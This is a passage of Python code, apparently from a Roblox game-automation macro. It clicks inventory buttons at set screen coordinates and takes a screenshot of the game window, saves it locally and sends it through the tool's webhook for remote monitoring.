            self.Global_MouseClick(equip_btn[0], equip_btn[1])
        time.sleep(step_delay)
        inventory_close_button = self.config.get("inventory_close_button", [1418, 298])
        if inventory_close_button and inventory_close_button[0] > 0:
            self.Global_MouseClick(inventory_close_button[0], inventory_close_button[1])
        time.sleep(0.12)

    def remote_take_and_send_screenshot(self):
        try:
            if not self.detection_running or self.reconnecting_state:
                return
            for _ in range(4):
                if not self.detection_running or self.reconnecting_state:
                    return
                self.activate_roblox_window()
                time.sleep(0.35)
            time.sleep(0.5)
            try:
                screenshot_dir = os.path.join(os.getcwd(), "images")
                os.makedirs(screenshot_dir, exist_ok=True)
                filename = os.path.join(screenshot_dir, f"remote_screenshot_{int(time.time())}.png")
                img = pyautogui.screenshot()
                img.save(filename)
                self.send_screen_screenshot_webhook(filename)
            except Exception as e:
                self.error_logging(e, "Error taking/sending remote screenshot")
        except Exception:
            pass
